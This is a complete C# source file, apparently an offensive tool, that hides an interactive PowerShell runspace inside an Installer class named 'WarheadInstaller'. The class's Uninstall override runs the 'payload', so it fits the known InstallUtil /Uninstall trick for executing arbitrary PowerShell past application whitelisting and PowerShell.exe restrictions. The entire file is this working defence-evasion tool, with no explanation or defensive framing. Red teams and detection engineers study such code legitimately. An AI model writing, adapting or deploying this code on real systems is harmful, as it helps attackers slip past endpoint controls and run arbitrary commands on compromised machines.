using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

[System.ComponentModel.RunInstaller(true)]
public class WarheadInstaller : Installer
{
    // This gets triggered when running /Uninstall
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Code.Main();
    }
}

public class Code
{
    // Main method to execute the payload
    public static void Main()
    {
        using (var runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();

            using (var PWSH = PowerShell.Create())
            {
                PWSH.Runspace = runspace;

                while (true)
                {
                    Console.Write("PS> ");
                    string input = Console.ReadLine();

                    if (string.IsNullOrWhiteSpace(input))
                        continue;

                    if (input.Trim().ToLower() == "exit")
                        break;

                    try
                    {
                        PWSH.Commands.Clear();
                        PWSH.AddScript(input);
                        var results = PWSH.Invoke();

                        if (PWSH.Streams.Error.Count > 0)
                        {
                            foreach (var error in PWSH.Streams.Error)
                            {
                                Console.WriteLine("Error: " + error.ToString());
                            }
                            PWSH.Streams.Error.Clear();
                        }
                        else
                        {
                            foreach (var result in results)
                            {
                                Console.WriteLine(result.ToString());
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Exception: " + ex.Message);
                    }
                }
            }
        }
    }
}
